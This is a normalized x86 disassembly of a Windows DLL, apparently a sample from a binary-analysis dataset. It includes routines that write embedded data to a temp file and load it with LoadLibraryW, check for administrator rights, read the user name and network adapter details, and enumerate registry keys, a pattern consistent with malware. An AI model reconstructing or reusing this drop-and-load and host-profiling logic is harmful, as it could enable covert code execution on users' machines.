push ecx
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov bl [ edi ]
movzx eax bl
push eax
inc edi
call [ isspace@IAT ]
pop ecx
test eax eax
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ ebp + 0x8 ]
jmp r-xdata
cmp bl 0x3d
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
or eax 0xffffffff
test bl bl
js r-xdata
movzx eax bl
mov al [ eax + r--data ]
test al al
js r-xdata
movsx esi al
shl esi 0x12
mov bl [ edi ]
movzx eax bl
push eax
inc edi
call [ isspace@IAT ]
pop ecx
test eax eax
jne r-xdata
test bl bl
je r-xdata
cmp bl 0x3d
je r-xdata
test bl bl
js r-xdata
movzx eax bl
mov al [ eax + r--data ]
test al al
js r-xdata
mov ecx [ ebp - 0x4 ]
movsx eax al
shl eax 0xc
or esi eax
mov eax esi
shr eax 0x10
inc [ ebp - 0x4 ]
mov [ ebp - 0x8 ] esi
mov [ ecx ] al
mov bl [ edi ]
movzx eax bl
push eax
inc edi
call [ isspace@IAT ]
pop ecx
test eax eax
jne r-xdata
test bl bl
je r-xdata
js r-xdata
cmp bl 0x3d
jne r-xdata
movzx eax bl
cmp [ eax + r--data ] 0x0
jge r-xdata
cmp bl 0x3d
jne r-xdata
mov ecx [ ebp - 0x4 ]
movzx eax bl
movsx eax [ eax + r--data ]
shl eax 0x6
or [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
shr eax 0x8
inc [ ebp - 0x4 ]
mov [ ecx ] al
mov bl [ edi ]
movzx eax bl
push eax
inc edi
call [ isspace@IAT ]
pop ecx
test eax eax
jne r-xdata
mov bl [ edi ]
movzx eax bl
push eax
inc edi
call [ isspace@IAT ]
pop ecx
test eax eax
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp bl 0x3d
je r-xdata
cmp bl 0x3d
je r-xdata
test bl bl
js r-xdata
movzx eax bl
mov al [ eax + r--data ]
test al al
js r-xdata
or al [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov [ ecx ] al
jmp r-xdata
sub_1000791a
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ SetErrorMode@IAT ]
push edi
push 0x1
xor ebx ebx
call esi
mov [ ebp - 0x28 ] eax
or eax 0x1
push eax
call esi
xor edi edi
inc edi
cmp edi 0x1a
jl r-xdata
test al 0x10
je r-xdata
lea eax [ edi + 0x41 ]
push eax
lea eax [ ebp - 0x24 ]
push r--data
push eax
call [ sprintf@IAT ]
add esp 0xc
lea eax [ ebp - 0x24 ]
push eax
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x28 ]
call esi
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
xor eax eax
inc eax
mov ecx edi
shl eax cl
or ebx eax
sub_10007992
push ebp
mov ebp esp
sub esp 0x85c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x400
push eax
lea eax [ ebp - 0x804 ]
push eax
call [ wcsncpy@IAT ]
mov edi [ memset@IAT ]
xor eax eax
push 0x10
mov [ ebp - 0x6 ] ax
xor esi esi
lea eax [ ebp - 0x814 ]
push esi
push eax
call edi
push 0x44
lea eax [ ebp - 0x85c ]
push esi
push eax
call edi
add esp 0x24
xor eax eax
mov [ ebp - 0x82c ] ax
lea eax [ ebp - 0x814 ]
push eax
lea eax [ ebp - 0x85c ]
push eax
push esi
push esi
push esi
push esi
push esi
push esi
lea eax [ ebp - 0x804 ]
push eax
push esi
mov [ ebp - 0x85c ] 0x44
mov [ ebp - 0x830 ] 0x1
call [ CreateProcessW@IAT ]
test eax eax
jne r-xdata
push 0xffffffff
push [ ebp - 0x814 ]
call [ WaitForSingleObject@IAT ]
lea eax [ ebp - 0x818 ]
push eax
push [ ebp - 0x814 ]
call [ GetExitCodeProcess@IAT ]
push [ ebp - 0x810 ]
mov esi [ CloseHandle@IAT ]
test eax eax
jne r-xdata
push 0x64
call esi
push [ ebp - 0x814 ]
call esi
mov eax [ ebp - 0x818 ]
call esi
push [ ebp - 0x814 ]
call esi
push 0x65
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10014571
leave
retn
pop eax
jmp r-xdata
sub_10007a8b
push ebp
mov ebp esp
sub esp 0x20c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x20c ]
push eax
call [ PathCanonicalizeW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10014571
leave
retn
lea eax [ ebp - 0x20c ]
push eax
push esi
call [ wcscpy@IAT ]
pop ecx
pop ecx
sub_10007acc
push 0x54
push r--data
call sub_10014f80
push 0x14
pop esi
mov [ ebp - 0x60 ] esi
xor ebx ebx
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] 0x500
mov [ ebp - 0x4 ] ebx
push 0x2
call [ ImpersonateSelf@IAT ]
lea eax [ ebp - 0x5c ]
push eax
push ebx
push 0x8
call [ GetCurrentThread@IAT ]
push eax
call [ OpenThreadToken@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x220
push 0x20
push 0x2
lea eax [ ebp - 0x24 ]
push eax
call [ AllocateAndInitializeSid@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x3f0
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10007c5a
cmp [ ebp - 0x58 ] ebx
setne al
call sub_10014fc8
retn
push esi
push 0x40
mov edi [ LocalAlloc@IAT ]
call edi
mov [ ebp - 0x4c ] eax
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x5c ]
push eax
push 0x8
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
push 0x1
push eax
call [ InitializeSecurityDescriptor@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x50 ]
call [ GetLengthSid@IAT ]
lea esi [ eax + 0x10 ]
push esi
push 0x40
call edi
mov [ ebp - 0x54 ] eax
cmp eax ebx
je r-xdata
push 0x2
pop edi
push edi
push esi
push eax
call [ InitializeAcl@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x50 ]
push 0x3
push edi
push [ ebp - 0x54 ]
call [ AddAccessAllowedAce@IAT ]
test eax eax
je r-xdata
push ebx
push [ ebp - 0x54 ]
xor esi esi
inc esi
push esi
push [ ebp - 0x4c ]
call [ SetSecurityDescriptorDacl@IAT ]
test eax eax
je r-xdata
push ebx
push [ ebp - 0x50 ]
push [ ebp - 0x4c ]
call [ SetSecurityDescriptorGroup@IAT ]
push ebx
push [ ebp - 0x50 ]
push [ ebp - 0x4c ]
call [ SetSecurityDescriptorOwner@IAT ]
push [ ebp - 0x4c ]
call [ IsValidSecurityDescriptor@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] 0x3
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
push esi
push [ ebp - 0x5c ]
push [ ebp - 0x4c ]
call [ AccessCheck@IAT ]
sub_10007c5a
call [ RevertToSelf@IAT ]
cmp [ ebp - 0x54 ] ebx
je r-xdata
cmp [ ebp - 0x4c ] ebx
je r-xdata
push [ ebp - 0x54 ]
call [ LocalFree@IAT ]
cmp [ ebp - 0x50 ] ebx
je r-xdata
push [ ebp - 0x4c ]
call [ LocalFree@IAT ]
retn
push [ ebp - 0x50 ]
call [ FreeSid@IAT ]
sub_10007c8b
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
call [ malloc@IAT ]
mov esi eax
pop ecx
test esi esi
je r-xdata
mov eax esi
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push esi
call [ memset@IAT ]
add esp 0xc
sub_10007cb3
push ebx
push edi
mov edi [ InitializeCriticalSection@IAT ]
lea eax [ esi + 0xc ]
mov [ esi + 0x4 ] 0xa
mov [ esi ] r--data
mov ebx r--data
push eax
mov [ esi + 0x8 ] ebx
call edi
xor eax eax
mov [ esi + 0x24 ] eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
lea eax [ esi + 0x34 ]
push eax
mov [ esi + 0x30 ] ebx
call edi
xor eax eax
push 0x2880
push eax
mov [ esi + 0x4c ] eax
mov [ esi + 0x50 ] eax
mov [ esi + 0x54 ] eax
lea eax [ esi + 0x58 ]
push eax
call [ memset@IAT ]
add esp 0xc
pop edi
mov eax esi
pop ebx
retn
sub_10007d0d
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10007d2d
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
pop ecx
sub_10007d2d
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
push 0x10
mov [ esi ] r--data
lea edi [ esi + 0xd8 ]
pop ebx
add edi 0x288
dec ebx
jne r-xdata
push edi
call [ DeleteFileW@IAT ]
cmp [ edi ] 0x0
je r-xdata
and [ ebp - 0x4 ] ebx
jmp r-xdata
lea edi [ ebp - 0x4 ]
lea eax [ esi + 0x8 ]
call sub_100031bc
test al al
jne r-xdata
push [ ebp - 0x4 ]
call [ free@IAT ]
pop ecx
jmp r-xdata
lea edi [ ebp - 0x4 ]
lea eax [ esi + 0x30 ]
call sub_100031bc
test al al
jne r-xdata
push [ ebp - 0x4 ]
call [ free@IAT ]
pop ecx
lea ecx [ esi + 0x30 ]
call sub_10008f0a
lea ecx [ esi + 0x8 ]
call sub_10008f0a
pop edi
mov [ esi ] r--data
pop esi
pop ebx
leave
retn
sub_10007daf
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
push 0x10
lea edi [ esi + 0xd8 ]
pop ebx
add edi 0x288
dec ebx
jne r-xdata
push edi
call [ DeleteFileW@IAT ]
cmp [ edi ] 0x0
je r-xdata
and [ ebp - 0x4 ] ebx
jmp r-xdata
lea edi [ ebp - 0x4 ]
lea eax [ esi + 0x8 ]
call sub_100031bc
test al al
jne r-xdata
push [ ebp - 0x4 ]
call [ free@IAT ]
pop ecx
jmp r-xdata
lea edi [ ebp - 0x4 ]
lea eax [ esi + 0x30 ]
call sub_100031bc
test al al
jne r-xdata
push [ ebp - 0x4 ]
call [ free@IAT ]
pop ecx
push 0x2880
push 0x0
add esi 0x58
push esi
call [ memset@IAT ]
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
sub_10007e29
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0xc ]
mov esi ecx
call sub_10007c8b
mov edi eax
pop ecx
test edi edi
je r-xdata
xor eax eax
pop edi
inc eax
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
call [ memcpy@IAT ]
add esp 0xc
push edi
add esi 0x8
call sub_1000315c
sub_10007e61
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
call sub_10007f1b
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ eax ]
mov ecx [ ebp + 0xc ]
xor ebx ebx
mov [ ecx ] eax
inc ebx
push edi
lea eax [ esi + 0x30 ]
lea edi [ ebp - 0x4 ]
call sub_100031bc
mov eax [ ebp - 0x4 ]
pop edi
test eax eax
je r-xdata
pop esi
mov eax ebx
pop ebx
leave
retn 0x8
sub_10007ea2
push ebp
mov ebp esp
push esi
push 0x218
call [ malloc@IAT ]
mov esi eax
pop ecx
test esi esi
je r-xdata
pop esi
pop ebp
retn 0xc
push ebx
mov ebx 0x10c
push ebx
push 0x0
push esi
call [ memset@IAT ]
and [ esi + 0x4 ] 0x0
mov al [ ebp + 0x8 ]
add esp 0xc
cmp [ ebp + 0xc ] 0x0
mov [ esi ] 0x218
mov [ esi + 0x8 ] al
je r-xdata
push ebx
push [ ebp + 0x10 ]
lea eax [ esi + 0x10c ]
push eax
call [ memcpy@IAT ]
add esp 0xc
mov eax esi
pop ebx
push 0x80
push [ ebp + 0xc ]
lea eax [ esi + 0xa ]
push eax
call [ wcsncpy@IAT ]
add esp 0xc
xor eax eax
mov [ esi + 0x108 ] ax
sub_10007f1b
push ebp
mov ebp esp
sub esp 0x21c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov ebx ecx
push edi
xor esi esi
lea eax [ ebx + 0x8 ]
lea edi [ ebp - 0x210 ]
mov [ ebp - 0x21c ] ebx
mov [ ebp - 0x218 ] esi
mov [ ebp - 0x210 ] esi
call sub_100031bc
test al al
jne r-xdata
mov ecx [ ebp - 0x210 ]
mov eax [ ecx + 0x4 ]
dec eax
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebx + 0x58 ]
mov ebx 0x288
dec eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
cmp esi 0xffffffff
jne r-xdata
inc esi
add eax ebx
cmp esi 0x10
jb r-xdata
lea edi [ ebx + 0x58 ]
mov [ ebp - 0x214 ] 0x10
mov ebx 0x288
jmp r-xdata
dec eax
jne r-xdata
lea eax [ ebp - 0x20c ]
push eax
mov edi 0x104
push edi
call [ GetTempPathW@IAT ]
mov ebx [ wcslen@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call ebx
mov ecx edi
sub ecx eax
push ecx
lea eax [ ebp - 0x20c ]
push r--data
push eax
call [ wcsncat@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call ebx
mov ebx [ ebp - 0x210 ]
mov ecx edi
sub ecx eax
push ecx
add ebx 0x8
lea eax [ ebp - 0x20c ]
push ebx
push eax
call [ wcsncat@IAT ]
add esp 0x20
xor eax eax
push eax
push 0x80
push 0x2
push eax
push eax
mov [ ebp - 0x6 ] ax
push __dos_header
lea eax [ ebp - 0x20c ]
push eax
call [ CreateFileW@IAT ]
mov [ ebp - 0x214 ] eax
cmp eax 0xffffffff
je r-xdata
mov esi 0xaa
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
jmp r-xdata
cmp [ edi ] si
je r-xdata
mov eax [ ebp - 0x218 ]
add ecx 0x8
push ecx
mov eax ebx
call sub_10008176
jmp r-xdata
call [ GetLastError@IAT ]
mov esi eax
push 0x0
lea eax [ ebp - 0x218 ]
push eax
mov eax [ ebp - 0x210 ]
push [ eax + 0x88 ]
add eax 0x8c
push eax
push [ ebp - 0x214 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax esi
call sub_1000737c
mov edi eax
jmp r-xdata
add edi ebx
dec [ ebp - 0x214 ]
jne r-xdata
add ecx 0x8
push ecx
push edi
call [ _wcsicmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
xor edi edi
call [ GetLastError@IAT ]
mov esi eax
imul esi esi 0x288
add esi [ ebp - 0x21c ]
push edi
mov edi [ wcsncpy@IAT ]
lea eax [ ebp - 0x20c ]
push eax
lea eax [ esi + 0xd8 ]
push eax
call edi
xor eax eax
push 0x40
mov [ esi + 0x2de ] ax
lea eax [ esi + 0x58 ]
push ebx
push eax
call edi
xor eax eax
add esp 0x18
mov [ esi + 0xd6 ] ax
xor esi esi
jmp r-xdata
push [ ebp - 0x210 ]
test esi esi
sete al
movzx eax al
push edi
push eax
call sub_10007ea2
mov [ ebp - 0x218 ] eax
test edi edi
je r-xdata
mov ecx [ ebp - 0x210 ]
jmp r-xdata
lea eax [ edi + 0x80 ]
cmp [ eax ] si
je r-xdata
push edi
call [ LocalFree@IAT ]
test esi esi
je r-xdata
push [ ebp - 0x214 ]
call [ CloseHandle@IAT ]
jmp r-xdata
push ebx
push esi
push edi
call [ memset@IAT ]
add esp 0xc
push eax
call [ DeleteFileW@IAT ]
sub_10008176
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ _wcsicmp@IAT ]
push edi
push r--data
push [ ebp + 0x8 ]
mov edi eax
xor ebx ebx
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
push [ ebp + 0x8 ]
call esi
pop ecx
pop ecx
test eax eax
je r-xdata
push edi
call sub_10008214
jmp r-xdata
xor ebx ebx
inc ebx
jmp r-xdata
push r--data
push [ ebp + 0x8 ]
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn 0x4
add edi 0x58
mov [ ebp - 0x4 ] 0x10
mov ecx edi
call sub_10008577
add edi 0x288
dec [ ebp - 0x4 ]
jne r-xdata
push edi
push [ ebp + 0x8 ]
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
test edi edi
je r-xdata
lea eax [ edi + 0x80 ]
push eax
call [ LoadLibraryW@IAT ]
test eax eax
je r-xdata
xor ebx ebx
inc ebx
push eax
call [ FreeLibrary@IAT ]
sub_10008214
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax 0x2bc64
call sub_10014ee0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2bc60 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ memset@IAT ]
push edi
mov edi 0x15e00
push edi
mov [ esp + 0x1c ] eax
xor ebx ebx
lea eax [ esp + 0x2c ]
push ebx
push eax
call esi
add esp 0xc
push edi
lea eax [ esp + 0x15e2c ]
push ebx
push eax
call esi
add esp 0xc
lea eax [ esp + 0x24 ]
push eax
lea eax [ esp + 0x2bc2c ]
push eax
mov [ esp + 0x24 ] ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x2c ] 0x40
call [ GetUserNameA@IAT ]
call sub_1000711a
mov edi [ _stricmp@IAT ]
and eax 0xffff0000
mov esi r--data
cmp eax 0x6000000
push esi
lea eax [ esp + 0x2bc2c ]
push eax
jb r-xdata
call edi
pop ecx
pop ecx
test eax eax
jne r-xdata
call edi
pop ecx
pop ecx
test eax eax
jne r-xdata
call sub_100106ce
fcomp [ r--data ]
lea ecx [ esp + 0x28 ]
fnstsw ax
test ah 0x1
jne r-xdata
lea eax [ esp + 0x20 ]
push eax
lea eax [ esp + 0x14 ]
push eax
call sub_10010970
lea eax [ esp + 0x20 ]
push eax
lea eax [ esp + 0x14 ]
push eax
call sub_100107a8
jmp r-xdata
call sub_1000e5a6
mov [ esp + 0x1c ] eax
call sub_1000ead9
push 0x80000
mov [ esp + 0x20 ] eax
call [ malloc@IAT ]
pop ecx
cmp eax ebx
je r-xdata
call sub_100106ce
push ecx
push ecx
fstp [ esp ]
push r--data
mov esi r--data
push esi
push [ esp + 0x28 ]
call sub_10008cb9
mov edi [ esp + 0x30 ]
mov eax [ esp + 0x28 ]
add esp 0x14
add eax edi
push eax
push r--data
push esi
push [ esp + 0x24 ]
call sub_10008cb9
add esp 0x10
mov ebx 0x380
test edi edi
je r-xdata
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esp + 0x20 ]
push [ esp + 0x14 ]
call sub_10010950
pop ecx
pop ecx
mov [ esp + 0x14 ] ebx
jmp r-xdata
mov edx eax
lea ecx [ esp + 0x15e28 ]
call sub_1000f25d
mov [ esp + 0x14 ] eax
jmp r-xdata
cmp [ esp + 0x14 ] 0x0
jbe r-xdata
mov eax [ esp + 0x1c ]
lea edi [ esp + 0x2a8 ]
mov [ esp + 0x10 ] eax
lea eax [ esp + 0x2bc28 ]
push esi
push eax
call edi
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
push esi
push [ esp + 0x20 ]
call sub_10008cb9
and [ esp + 0x20 ] 0x0
add esp 0xc
push 0x35c
call [ operator new@IAT ]
pop ecx
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
lea edi [ esp + 0x160a8 ]
mov [ esp + 0x10 ] eax
lea eax [ edi + 0x80 ]
push eax
push edi
lea eax [ edi - 0x200 ]
push eax
lea eax [ edi - 0x280 ]
push eax
push r--data
push esi
push [ esp + 0x30 ]
call sub_10008cb9
add esp 0x1c
add edi ebx
dec [ esp + 0x10 ]
jne r-xdata
xor esi esi
call sub_1000f362
mov esi eax
jmp r-xdata
lea eax [ edi + 0x80 ]
push eax
push edi
lea eax [ edi - 0x200 ]
push eax
lea eax [ edi - 0x280 ]
push eax
push r--data
push esi
push [ esp + 0x30 ]
call sub_10008cb9
add esp 0x1c
add edi ebx
dec [ esp + 0x10 ]
jne r-xdata
push [ esp + 0x14 ]
mov edi r--data
push r--data
push edi
push [ esp + 0x24 ]
call sub_10008cb9
add esp 0x10
cmp [ esp + 0x14 ] 0x0
jbe r-xdata
lea eax [ esp + 0x28 ]
push eax
mov ecx esi
call sub_1000f74f
mov [ esp + 0x14 ] eax
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax ]
test esi esi
je r-xdata
push r--data
push edi
push [ esp + 0x20 ]
call sub_10008cb9
lea eax [ esp + 0x34 ]
add esp 0xc
push eax
call sub_1000ff9a
pop ecx
push eax
push r--data
mov edi r--data
push edi
push [ esp + 0x24 ]
mov [ esp + 0x2c ] eax
call sub_10008cb9
add esp 0x10
cmp [ esp + 0x1c ] 0x0
jbe r-xdata
mov eax [ esp + 0x14 ]
lea esi [ esp + 0x2a8 ]
mov [ esp + 0x10 ] eax
push r--data
push edi
push [ esp + 0x20 ]
call sub_10008cb9
mov ecx [ esp + 0x2bc78 ]
add esp 0xc
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10014571
mov esp ebp
pop ebp
retn 0x4
mov eax [ esp + 0x1c ]
lea esi [ esp + 0x2a8 ]
mov [ esp + 0x10 ] eax
lea eax [ esi + 0x80 ]
push eax
push esi
lea eax [ esi - 0x200 ]
push eax
lea eax [ esi - 0x280 ]
push eax
push r--data
push edi
push [ esp + 0x30 ]
call sub_10008cb9
add esp 0x1c
add esi ebx
dec [ esp + 0x10 ]
jne r-xdata
lea eax [ esi + 0x80 ]
push eax
push esi
lea eax [ esi - 0x200 ]
push eax
lea eax [ esi - 0x280 ]
push eax
push r--data
push edi
push [ esp + 0x30 ]
call sub_10008cb9
add esp 0x1c
add esi ebx
dec [ esp + 0x10 ]
jne r-xdata
sub_10008577
push ebp
mov ebp esp
mov eax 0x1510
call sub_10014ee0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
lea eax [ ebp - 0xbcc ]
mov esi ecx
push 0x400
push eax
mov [ ebp - 0x1508 ] esi
call sub_10010b38
lea eax [ ebp - 0xbcc ]
push eax
push r--data
push r--data
push esi
call sub_10008cb9
mov esi 0xa200
push esi
call [ malloc@IAT ]
mov edi eax
xor ebx ebx
add esp 0x1c
mov [ ebp - 0x14f8 ] edi
mov [ ebp - 0x1510 ] esi
cmp edi ebx
je r-xdata
push ebx
lea eax [ ebp - 0x14fc ]
push eax
push ebx
push 0x20019
push ebx
push ebx
push ebx
push r--data
push 0x80000002
call [ RegCreateKeyExW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x1510 ]
push eax
push edi
call [ GetAdaptersInfo@IAT ]
test eax eax
jne r-xdata
mov edi [ RegEnumKeyExW@IAT ]
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x14f4 ]
push eax
lea eax [ ebp - 0x3cc ]
push eax
mov [ ebp - 0x1500 ] ebx
push ebx
mov esi 0x80000003
jmp r-xdata
mov esi [ RegQueryValueExW@IAT ]
lea eax [ ebp - 0x1500 ]
push eax
push ebx
lea eax [ ebp - 0x14f4 ]
push eax
push ebx
mov edi r--data
push edi
push [ ebp - 0x14fc ]
call esi
test eax eax
jne r-xdata
push [ ebp - 0x14f8 ]
call [ free@IAT ]
pop ecx
mov esi edi
mov edi [ strlen@IAT ]
push esi
mov [ ebp - 0x14f4 ] 0x208
call edi
cmp eax 0x103
jne r-xdata
push [ ebp - 0x14fc ]
call [ RegCloseKey@IAT ]
cmp [ ebp - 0x14f4 ] 0x1
jne r-xdata
mov [ ebp - 0xc4 ] bl
lea eax [ esi + 0x1ac ]
jmp r-xdata
jmp r-xdata
cmp eax ebx
jne r-xdata
mov esi r--data
lea edi [ ebp - 0x14f0 ]
movsd [ edi ] [ esi ]
push 0x7a
lea eax [ ebp - 0x14ea ]
push ebx
push eax
movsw [ edi ] [ esi ]
call memset
push 0x6
pop ecx
mov esi r--data
lea edi [ ebp - 0x1470 ]
[ edi ] [ esi ]
push 0x66
lea eax [ ebp - 0x1456 ]
push ebx
push eax
movsw [ edi ] [ esi ]
call memset
mov [ ebp - 0x13f0 ] ebx
mov esi r--data
lea edi [ ebp - 0x13ec ]
movsd [ edi ] [ esi ]
push 0x7a
lea eax [ ebp - 0x13e6 ]
push ebx
push eax
movsw [ edi ] [ esi ]
call memset
push 0x6
pop ecx
mov esi r--data
lea edi [ ebp - 0x136c ]
[ edi ] [ esi ]
push 0x66
lea eax [ ebp - 0x1352 ]
push ebx
push eax
movsw [ edi ] [ esi ]
call memset
mov [ ebp - 0x12ec ] ebx
mov esi r--data
lea edi [ ebp - 0x12e8 ]
movsd [ edi ] [ esi ]
push 0x7a
lea eax [ ebp - 0x12e2 ]
push ebx
push eax
movsw [ edi ] [ esi ]
call memset
push 0x5
pop ecx
mov esi r--data
lea edi [ ebp - 0x1268 ]
[ edi ] [ esi ]
push 0x6a
lea eax [ ebp - 0x1252 ]
push ebx
push eax
movsw [ edi ] [ esi ]
call memset
add esp 0x48
mov [ ebp - 0x11e8 ] ebx
mov esi r--data
lea edi [ ebp - 0x11e4 ]
movsd [ edi ] [ esi ]
push 0x7a
lea eax [ ebp - 0x11de ]
push ebx
push eax
movsw [ edi ] [ esi ]
call memset
push 0x6
pop ecx
mov esi r--data
lea edi [ ebp - 0x1164 ]
push 0x68
[ edi ] [ esi ]
push ebx
lea eax [ ebp - 0x114c ]
push eax
call memset
mov eax [ r--data ]
mov [ ebp - 0x10e0 ] eax
mov eax [ r--data ]
push 0x78
mov [ ebp - 0x10dc ] eax
lea eax [ ebp - 0x10d8 ]
push ebx
push eax
mov [ ebp - 0x10e4 ] ebx
call memset
push 0x9
pop ecx
push 0x5c
lea eax [ ebp - 0x103c ]
push ebx
mov esi r--data
lea edi [ ebp - 0x1060 ]
push eax
[ edi ] [ esi ]
call memset
mov [ ebp - 0xfe0 ] ebx
mov esi r--data
lea edi [ ebp - 0xfdc ]
movsd [ edi ] [ esi ]
push 0x7a
lea eax [ ebp - 0xfd6 ]
push ebx
push eax
movsw [ edi ] [ esi ]
call memset
mov esi r--data
lea edi [ ebp - 0xf5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x70
lea eax [ ebp - 0xf4c ]
push ebx
push eax
movsd [ edi ] [ esi ]
call memset
mov [ ebp - 0xedc ] ebx
mov esi r--data
lea edi [ ebp - 0xed8 ]
movsd [ edi ] [ esi ]
add esp 0x48
movsd [ edi ] [ esi ]
push 0x74
lea eax [ ebp - 0xecc ]
push ebx
push eax
movsd [ edi ] [ esi ]
call memset
push 0x5
pop ecx
push 0x6c
lea eax [ ebp - 0xe44 ]
push ebx
mov esi r--data
lea edi [ ebp - 0xe58 ]
push eax
[ edi ] [ esi ]
call memset
mov [ ebp - 0xdd8 ] ebx
mov esi r--data
lea edi [ ebp - 0xdd4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x74
lea eax [ ebp - 0xdc8 ]
push ebx
push eax
movsd [ edi ] [ esi ]
call memset
mov esi r--data
lea edi [ ebp - 0xd54 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x6e
lea eax [ ebp - 0xd42 ]
push ebx
push eax
movsw [ edi ] [ esi ]
call memset
mov eax [ r--data ]
mov [ ebp - 0xcd0 ] eax
mov eax [ r--data ]
push 0x78
mov [ ebp - 0xccc ] eax
lea eax [ ebp - 0xcc8 ]
push ebx
push eax
mov [ ebp - 0xcd4 ] ebx
call memset
push 0x6
pop ecx
push 0x68
lea eax [ ebp - 0xc38 ]
push ebx
mov esi r--data
lea edi [ ebp - 0xc50 ]
push eax
[ edi ] [ esi ]
call memset
add esp 0x48
xor eax eax
mov [ ebp - 0xbd0 ] ebx
mov ebx [ _snwprintf@IAT ]
mov [ ebp - 0x7cc ] ax
lea esi [ ebp - 0x14f0 ]
mov [ ebp - 0x14f8 ] 0x9
push [ ebp - 0x1500 ]
call [ malloc@IAT ]
pop ecx
mov [ ebp - 0x1504 ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x14f4 ] eax
cmp eax ebx
jne r-xdata
dec eax
cmp ecx eax
movzx eax [ esi + ecx + 0x194 ]
push eax
lea eax [ ebp - 0x44 ]
jne r-xdata
inc [ ebp - 0x1500 ]
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x14f4 ]
push eax
lea eax [ ebp - 0x3cc ]
push eax
push [ ebp - 0x1500 ]
lea eax [ ebp - 0x3cc ]
push eax
